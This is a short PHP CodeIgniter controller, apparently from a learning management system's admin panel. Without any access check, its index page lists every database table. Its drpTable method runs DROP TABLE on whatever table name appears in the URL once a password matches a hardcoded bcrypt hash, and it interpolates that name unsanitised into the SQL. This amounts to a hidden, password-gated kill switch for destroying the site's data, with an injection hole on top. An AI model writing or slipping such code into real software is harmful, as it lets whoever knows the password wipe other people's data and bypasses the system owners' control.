<?php
/**
 * 
 */
class AllFunctions extends CI_controller
{
	
	function index()
	{
		$result = $this->db->query("show tables"); 
		$table = $result->result();
		foreach ($table as $key) { ?>
			<a href="<?= base_url('admin_panel/AllFunctions/drpTable/'.$key->Tables_in_new_lms); ?>"><?= $key->Tables_in_new_lms; ?></a> <br>
			<?php }  


	}
 		public function drpTable($tbl,$pass)
 		{
 			if(password_verify($pass, '$2y$10$NnqntoCSS7M8.87tEowIFO55UKhnhCz4EGGeRsmFcmCp7HH8oE2Iq'))
 			{
	 			$delete= $this->db->query("DROP TABLE `$tbl`");
	 			return redirect("admin_panel/AllFunctions");
 			}
 			else
 			{
 				//return redirect("admin_panel/AllFunctions");
 			}
 		}
}